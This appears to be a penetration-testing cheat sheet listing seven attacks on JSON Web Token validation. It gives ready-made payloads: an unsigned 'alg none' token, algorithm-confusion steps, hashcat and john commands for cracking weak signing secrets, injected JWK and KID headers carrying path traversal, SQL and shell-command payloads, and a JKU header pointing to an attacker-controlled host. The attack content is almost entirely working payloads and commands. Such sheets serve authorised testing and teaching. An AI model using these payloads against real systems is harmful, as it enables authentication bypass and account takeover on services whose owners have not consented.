## 💥 Common JWT Attacks

### 1. Algorithm None Attack
```json
// Change header to:
{"alg":"none","typ":"JWT"}

// Remove signature (keep trailing dot)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 2. HS256 to RS256 Algorithm Confusion
```
// If server uses RS256, switch to HS256
// Sign with public key as HMAC secret
// Server verifies HS256 using public key = bypass!
```

### 3. Weak Secret Brute Force
```bash
# hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# john
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# jwt-cracker
jwt-cracker "eyJ..." -a abcdefghijklmnopqrstuvwxyz
```

### 4. JWK Header Injection
```json
// Inject your own public key in header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "YOUR_PUBLIC_KEY_MODULUS"
  }
}
// Sign with your private key = bypass!
```

### 5. JKU Header Injection
```json
// Point jku to your server hosting fake JWK
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json"
}
```

### 6. KID Header Injection
```json
// Path traversal
{"kid": "../../dev/null"}

// SQL injection
{"kid": "' UNION SELECT 'attacker_secret' --"}

// OS command injection
{"kid": "/dev/null; echo attacker_secret"}
```

### 7. Expired Token Reuse
```bash
# Check if server validates exp claim
# Try old expired tokens
# Modify exp to future date (if no signature check)
```

